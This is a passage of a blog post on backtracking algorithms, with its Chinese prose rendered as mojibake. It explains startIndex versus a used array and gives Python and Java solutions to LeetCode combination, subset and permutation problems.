<code>[1,2,3]</code> çš„æ‰€æœ‰å­é›†</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, <span class="number">0</span>, [], result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, startIndex, path, result</span>):</span><br><span class="line">        result.append(path[:])  <span class="comment"># å­é›†é—®é¢˜å¯ä»¥éšæ—¶æ”¶é›†ç»“æœ</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):  <span class="comment"># å…³é”®ï¼šé¿å…é‡å¤é€‰æ‹©</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">            path.pop()  <span class="comment"># å›æº¯</span></span><br><span class="line"></span><br><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.subsets([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br></pre></td></tr></table></figure><h4 id="ğŸ“Œ-startIndex-ä½œç”¨"><a href="#ğŸ“Œ-startIndex-ä½œç”¨" class="headerlink" title="ğŸ“Œ startIndex ä½œç”¨"></a><strong>ğŸ“Œ <code>startIndex</code> ä½œç”¨</strong></h4><ul><li><strong>ä¿è¯å­é›†ä¸­çš„å…ƒç´ ä¸é‡å¤</strong></li><li><strong>é¿å… <code>[2,1]</code> è¿™æ ·çš„æƒ…å†µå‡ºç°</strong></li><li><strong>è¾“å‡ºç»“æœ</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[], [<span class="number">1</span>], [<span class="number">1</span>,<span class="number">2</span>], [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>,<span class="number">3</span>], [<span class="number">2</span>], [<span class="number">2</span>,<span class="number">3</span>], [<span class="number">3</span>]]</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="3-startIndex-æ€»ç»“"><a href="#3-startIndex-æ€»ç»“" class="headerlink" title="3. startIndex æ€»ç»“"></a><strong>3. <code>startIndex</code> æ€»ç»“</strong></h3><table><thead><tr><th>é—®é¢˜</th><th><code>startIndex</code> æ˜¯å¦éœ€è¦</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><strong>ç»„åˆï¼ˆCombinationï¼‰</strong></td><td>âœ… éœ€è¦</td><td>é¿å…é‡å¤é€‰æ‹©ï¼Œæ§åˆ¶æœç´¢èŒƒå›´</td></tr><tr><td><strong>æ’åˆ—ï¼ˆPermutationï¼‰</strong></td><td>âŒ ä¸éœ€è¦</td><td>æ’åˆ—å…è®¸äº¤æ¢é¡ºåºï¼Œä¸é™åˆ¶æœç´¢æ–¹å‘</td></tr><tr><td><strong>å­é›†ï¼ˆSubsetsï¼‰</strong></td><td>âœ… éœ€è¦</td><td>é¿å…é‡å¤é€‰æ‹©ï¼Œæ§åˆ¶å”¯ä¸€æ€§</td></tr><tr><td><strong>å›æ–‡åˆ†å‰²ï¼ˆPalindrome Partitioningï¼‰</strong></td><td>âœ… éœ€è¦</td><td>æ§åˆ¶åˆ‡å‰²ç‚¹ï¼Œé¿å…é‡å¤åˆ†å‰²</td></tr></tbody></table><h4 id="ğŸš€-è®°ä½è¿™æ¡è§„åˆ™"><a href="#ğŸš€-è®°ä½è¿™æ¡è§„åˆ™" class="headerlink" title="ğŸš€ è®°ä½è¿™æ¡è§„åˆ™"></a><strong>ğŸš€ è®°ä½è¿™æ¡è§„åˆ™</strong></h4><ul><li><strong>å¦‚æœé—®é¢˜å…è®¸å…ƒç´ äº¤æ¢é¡ºåºï¼ˆå¦‚æ’åˆ—ï¼‰ â†’ <code>startIndex</code> <strong>ä¸éœ€è¦</strong>ã€‚</strong></li><li><strong>å¦‚æœé—®é¢˜éœ€è¦ä¿è¯å…ƒç´ é¡ºåºï¼ˆå¦‚ç»„åˆã€å­é›†ï¼‰ â†’ <code>startIndex</code> <strong>éœ€è¦</strong>ã€‚</strong></li><li><strong>å¦‚æœæ˜¯åˆ†å‰²é—®é¢˜ï¼ˆå¦‚å›æ–‡åˆ†å‰²ï¼‰ â†’ <code>startIndex</code> ä¹Ÿéœ€è¦ï¼Œæ§åˆ¶åˆ‡å‰²ç‚¹ã€‚</strong></li></ul><hr><h3 id="4-startIndex-ä¸-used-æ•°ç»„çš„åŒºåˆ«"><a href="#4-startIndex-ä¸-used-æ•°ç»„çš„åŒºåˆ«" class="headerlink" title="4. startIndex ä¸ used æ•°ç»„çš„åŒºåˆ«"></a><strong>4. <code>startIndex</code> ä¸ <code>used</code> æ•°ç»„çš„åŒºåˆ«</strong></h3><p>æœ‰æ—¶å€™ï¼Œåœ¨æ’åˆ—é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ <code>used</code> æ•°ç»„ä»£æ›¿ <code>startIndex</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">used = [<span class="literal">False</span>] * <span class="built_in">len</span>(nums)</span><br></pre></td></tr></table></figure><ul><li><strong><code>startIndex</code> ä½œç”¨</strong> â†’ é™åˆ¶æœç´¢èŒƒå›´ï¼Œ<strong>ä¿è¯é€’å¢ã€ä¸é‡å¤é€‰æ‹©</strong>ï¼ˆç”¨äºç»„åˆã€å­é›†ï¼‰ã€‚</li><li><strong><code>used</code> ä½œç”¨</strong> â†’ è®°å½•æŸä¸ªå…ƒç´ æ˜¯å¦è¢«ç”¨è¿‡ï¼Œ<strong>é¿å…åŒå±‚é‡å¤é€‰æ‹©</strong>ï¼ˆç”¨äºæ’åˆ—ã€å«é‡å¤å…ƒç´ çš„ç»„åˆï¼‰ã€‚</li></ul><p><strong>ä¾‹å­ï¼šå«é‡å¤å…ƒç´ çš„æ’åˆ—</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permuteUnique</span>(<span class="params">self, nums</span>):</span><br><span class="line">        result = []</span><br><span class="line">        used = [<span class="literal">False</span>] * <span class="built_in">len</span>(nums)</span><br><span class="line">        nums.sort()  <span class="comment"># æ’åºï¼Œæ–¹ä¾¿å»é‡</span></span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, [], used, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, path, used, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) == <span class="built_in">len</span>(nums):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> used[i]:  <span class="comment"># è¿™ä¸ªå…ƒç´ å·²ç»è¢«é€‰è¿‡</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>] <span class="keyword">and</span> <span class="keyword">not</span> used[i - <span class="number">1</span>]:  <span class="comment"># é¿å…åŒå±‚é‡å¤</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            used[i] = <span class="literal">True</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, path, used, result)</span><br><span class="line">            path.pop()</span><br><span class="line">            used[i] = <span class="literal">False</span>  <span class="comment"># å›æº¯ï¼Œæ’¤é”€é€‰æ‹©</span></span><br></pre></td></tr></table></figure><h2 id="77-ç»„åˆ"><a href="#77-ç»„åˆ" class="headerlink" title="77. ç»„åˆ"></a>77. ç»„åˆ</h2><p>ç»™å®šä¸¤ä¸ªæ•´æ•° n å’Œ kï¼Œè¿”å›èŒƒå›´ [1, n] ä¸­æ‰€æœ‰å¯èƒ½çš„ k ä¸ªæ•°çš„ç»„åˆã€‚<br>ä½ å¯ä»¥æŒ‰ ä»»ä½•é¡ºåº è¿”å›ç­”æ¡ˆã€‚</p><p>ç›´æ¥æƒ³åˆ°çš„æ˜¯forå¾ªç¯åµŒå¥—,ä½†æ˜¯å¦‚æœkå¾ˆå¤§çš„è¯å°±ä¼šéœ€è¦å¾ˆå¤šä¸ªforå¾ªç¯è¿›è¡ŒåµŒå¥—,è¿™æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„,æ‰€ä»¥éœ€è¦ç”¨åˆ°å›æº¯ç®—æ³•.<br>é€’å½’æ¥åšå±‚å åµŒå¥—ï¼ˆå¯ä»¥ç†è§£æ˜¯å¼€kå±‚forå¾ªç¯ï¼‰ï¼Œæ¯ä¸€æ¬¡çš„é€’å½’ä¸­åµŒå¥—ä¸€ä¸ªforå¾ªç¯ï¼Œé‚£ä¹ˆé€’å½’å°±å¯ä»¥ç”¨äºè§£å†³å¤šå±‚åµŒå¥—å¾ªç¯çš„é—®é¢˜äº†ã€‚<br><img src="/2024/11/29/algorithm/backtracking/image.png" alt="ç»„åˆé—®é¢˜å¯ä»¥æŠ½è±¡ä¸ºæ ‘é—®é¢˜"><br>ä½†æ˜¯å›æº¯è¿‡ç¨‹å¯ä»¥è¿›è¡Œå‰ªæä¼˜åŒ–,å¦‚ä¸‹å›¾,n &#x3D; 4ï¼Œk &#x3D; 4çš„è¯ï¼Œé‚£ä¹ˆç¬¬ä¸€å±‚forå¾ªç¯çš„æ—¶å€™ï¼Œä»å…ƒç´ 2å¼€å§‹çš„éå†éƒ½æ²¡æœ‰æ„ä¹‰äº†ã€‚ åœ¨ç¬¬äºŒå±‚forå¾ªç¯ï¼Œä»å…ƒç´ 3å¼€å§‹çš„éå†éƒ½æ²¡æœ‰æ„ä¹‰äº†ã€‚<br><img src="/2024/11/29/algorithm/backtracking/image-1.png"><br>ä¼˜åŒ–è¿‡ç¨‹å¦‚ä¸‹ï¼š<br>å·²ç»é€‰æ‹©çš„å…ƒç´ ä¸ªæ•°ï¼špath.size();<br>è¿˜éœ€è¦çš„å…ƒç´ ä¸ªæ•°ä¸º: k - path.size();<br>åœ¨é›†åˆnä¸­è‡³å¤šè¦ä»è¯¥èµ·å§‹ä½ç½® : n - (k - path.size()) + 1ï¼Œå¼€å§‹éå†<br>ä¸ºä»€ä¹ˆæœ‰ä¸ª+1å‘¢ï¼Œå› ä¸ºåŒ…æ‹¬èµ·å§‹ä½ç½®ï¼Œæˆ‘ä»¬è¦æ˜¯ä¸€ä¸ªå·¦é—­çš„é›†åˆã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œn &#x3D; 4ï¼Œk &#x3D; 3ï¼Œ ç›®å‰å·²ç»é€‰å–çš„å…ƒç´ ä¸º0ï¼ˆpath.sizeä¸º0ï¼‰ï¼Œn - (k - 0) + 1 å³ 4 - ( 3 - 0) + 1 &#x3D; 2ã€‚<br>ä»2å¼€å§‹æœç´¢éƒ½æ˜¯åˆç†çš„ï¼Œå¯ä»¥æ˜¯ç»„åˆ[2, 3, 4]ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n, k, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> startIndex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= n - (k - path.size()) + <span class="number">1</span>; i++)&#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n, k, i+<span class="number">1</span>);</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="216-ç»„åˆæ€»å’Œ-III"><a href="#216-ç»„åˆæ€»å’Œ-III" class="headerlink" title="216. ç»„åˆæ€»å’Œ III"></a>216. ç»„åˆæ€»å’Œ III</h2><p>æ‰¾å‡ºæ‰€æœ‰ç›¸åŠ ä¹‹å’Œä¸º n çš„ k ä¸ªæ•°çš„ç»„åˆï¼Œä¸”æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š</p><p>åªä½¿ç”¨æ•°å­—1åˆ°9<br>æ¯ä¸ªæ•°å­— æœ€å¤šä½¿ç”¨ä¸€æ¬¡<br>è¿”å› æ‰€æœ‰å¯èƒ½çš„æœ‰æ•ˆç»„åˆçš„åˆ—è¡¨ ã€‚è¯¥åˆ—è¡¨ä¸èƒ½åŒ…å«ç›¸åŒçš„ç»„åˆä¸¤æ¬¡ï¼Œç»„åˆå¯ä»¥ä»¥ä»»ä½•é¡ºåºè¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum3</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        backTracking(n, k, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backTracking</span><span class="params">(<span class="type">int</span> targetSum, <span class="type">int</span> k, <span class="type">int</span> startIndex, <span class="type">int</span> sum)</span>&#123;</span><br><span class="line">        <span class="comment">// å‰ªæ</span></span><br><span class="line">        <span class="keyword">if</span>(sum &gt; targetSum)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sum == targetSum) result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‰ªæ 9 - (k - path.size()) + 1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= <span class="number">9</span> - (k - path.size())+<span class="number">1</span>; i++)&#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            sum += i;</span><br><span class="line">            backTracking(targetSum, k, i+<span class="number">1</span>, sum);</span><br><span class="line">            path.removeLast();</span><br><span class="line">            sum -= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="17-ç”µè¯å·ç çš„å­—æ¯ç»„åˆ"><a href="#17-ç”µè¯å·ç çš„å­—æ¯ç»„åˆ" class="headerlink" title="17.ç”µè¯å·ç çš„å­—æ¯ç»„åˆ"></a>17.ç”µè¯å·ç çš„å­—æ¯ç»„åˆ</h2><p>ç»™å®šä¸€ä¸ªä»…åŒ…å«æ•°å­— 2-9 çš„å­—ç¬¦ä¸²ï¼Œè¿”å›æ‰€æœ‰å®ƒèƒ½è¡¨ç¤ºçš„å­—æ¯ç»„åˆã€‚ç­”æ¡ˆå¯ä»¥æŒ‰ ä»»æ„é¡ºåº è¿”å›ã€‚</p><p>ç»™å‡ºæ•°å­—åˆ°å­—æ¯çš„æ˜ å°„å¦‚ä¸‹ï¼ˆä¸ç”µè¯æŒ‰é”®ç›¸åŒï¼‰ã€‚æ³¨æ„ 1 ä¸å¯¹åº”ä»»ä½•å­—æ¯ã€‚<br><img src="/2024/11/29/algorithm/backtracking/image-2.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits == <span class="literal">null</span> || digits.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] numString = &#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;abc&quot;</span>,<span class="string">&quot;def&quot;</span>, <span class="string">&quot;ghi&quot;</span>, <span class="string">&quot;jkl&quot;</span>, <span class="string">&quot;mno&quot;</span>, <span class="string">&quot;pqrs&quot;</span>, <span class="string">&quot;tuv&quot;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        backTracking(digits, numString, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backTracking</span><span class="params">(String digits, String[] numString, <span class="type">int</span> num)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(num == digits.length())&#123;</span><br><span class="line">            list.add(temp.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> numString[digits.charAt(num) - <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++)&#123;</span><br><span class="line">            temp.append(str.charAt(i));</span><br><span class="line">            backTracking(digits, numString, num+<span class="number">1</span>);</span><br><span class="line">            temp.deleteCharAt(temp.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="39-ç»„åˆæ€»å’Œ"><a href="#39-ç»„åˆæ€»å’Œ" class="headerlink" title="39. ç»„åˆæ€»å’Œ"></a>39. ç»„åˆæ€»å’Œ</h2><p>ç»™ä½ ä¸€ä¸ª æ— é‡å¤å…ƒç´  çš„æ•´æ•°æ•°ç»„ candidates å’Œä¸€ä¸ªç›®æ ‡æ•´æ•° target ï¼Œæ‰¾å‡º candidates ä¸­å¯ä»¥ä½¿æ•°å­—å’Œä¸ºç›®æ ‡æ•° target çš„ æ‰€æœ‰ ä¸åŒç»„åˆ ï¼Œå¹¶ä»¥åˆ—è¡¨å½¢å¼è¿”å›ã€‚ä½ å¯ä»¥æŒ‰ ä»»æ„é¡ºåº è¿”å›è¿™äº›ç»„åˆã€‚<br>candidates ä¸­çš„ åŒä¸€ä¸ª æ•°å­—å¯ä»¥ æ— é™åˆ¶é‡å¤è¢«é€‰å– ã€‚å¦‚æœè‡³å°‘ä¸€ä¸ªæ•°å­—çš„è¢«é€‰æ•°é‡ä¸åŒï¼Œåˆ™ä¸¤ç§ç»„åˆæ˜¯ä¸åŒçš„ã€‚<br>å¯¹äºç»™å®šçš„è¾“å…¥ï¼Œä¿è¯å’Œä¸º target çš„ä¸åŒç»„åˆæ•°å°‘äº 150 ä¸ªã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtracking(res, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(), candidates, target, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; res, List&lt;Integer&gt; path, <span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> sum, <span class="type">int</span> idx)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=idx; i &lt; candidates.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target) <span class="keyword">break</span>;</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backtracking(res, path, candidates, target, sum+candidates[i], i);  <span class="comment">// è¿™é“é¢˜çš„å…³é”®ç‚¹åœ¨è¿™é‡Œ iä¸ç”¨åŠ 1ï¼Œæ‰€ä»¥å¯ä»¥é‡å¤é€‰æ‹©i</span></span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="40-ç»„åˆæ€»å’ŒII"><a href="#40-ç»„åˆæ€»å’ŒII" class="headerlink" title="40.ç»„åˆæ€»å’ŒII"></a>40.ç»„åˆæ€»å’ŒII</h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„ candidates å’Œä¸€ä¸ªç›®æ ‡æ•° target ï¼Œæ‰¾å‡º candidates ä¸­æ‰€æœ‰å¯ä»¥ä½¿æ•°å­—å’Œä¸º target çš„ç»„åˆã€‚</p><p>candidates ä¸­çš„æ¯ä¸ªæ•°å­—åœ¨æ¯ä¸ªç»„åˆä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚</p><p>è¯´æ˜ï¼š æ‰€æœ‰æ•°å­—ï¼ˆåŒ…æ‹¬ç›®æ ‡æ•°ï¼‰éƒ½æ˜¯æ­£æ•´æ•°ã€‚è§£é›†ä¸èƒ½åŒ…å«é‡å¤çš„ç»„åˆã€‚</p><p>ç¤ºä¾‹ 1:<br>è¾“å…¥: candidates &#x3D; <code>[10,1,2,7,6,1,5]</code>, target &#x3D; 8,<br>æ‰€æ±‚è§£é›†ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [1, 7],</span><br><span class="line">  [1, 2, 5],</span><br><span class="line">  [2, 6],</span><br><span class="line">  [1, 1, 6]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®å’Œ39.ç»„åˆæ€»å’Œ (opens new window)å¦‚ä¸‹åŒºåˆ«ï¼š<br>æœ¬é¢˜candidates ä¸­çš„æ¯ä¸ªæ•°å­—åœ¨æ¯ä¸ªç»„åˆä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚<br>æœ¬é¢˜æ•°ç»„candidatesçš„å…ƒç´ æ˜¯æœ‰é‡å¤çš„ï¼Œè€Œ39.ç»„åˆæ€»å’Œ (opens new window)æ˜¯æ— é‡å¤å…ƒç´ çš„æ•°ç»„candidates</p><p>æˆ‘ä»¬è¦å»é‡çš„æ˜¯åŒä¸€æ ‘å±‚ä¸Šçš„â€œä½¿ç”¨è¿‡â€ï¼ŒåŒä¸€æ ‘æä¸Šçš„éƒ½æ˜¯ä¸€ä¸ªç»„åˆé‡Œçš„å…ƒç´ ï¼Œä¸ç”¨å»é‡ã€‚<br>ä¸ºäº†ç†è§£å»é‡æˆ‘ä»¬æ¥ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œcandidates &#x3D; [1, 1, 2], target &#x3D; 3ï¼Œï¼ˆæ–¹ä¾¿èµ·è§candidateså·²ç»æ’åºäº†ï¼‰<br>å¼ºè°ƒä¸€ä¸‹ï¼Œæ ‘å±‚å»é‡çš„è¯ï¼Œéœ€è¦å¯¹æ•°ç»„æ’åºï¼</p><p>å¦‚ä½•åˆ¤æ–­åŒä¸€æ ‘å±‚ä¸Šå…ƒç´ ï¼ˆç›¸åŒçš„å…ƒç´ ï¼‰æ˜¯å¦ä½¿ç”¨è¿‡äº†å‘¢ã€‚<br>å¦‚æœcandidates[i] 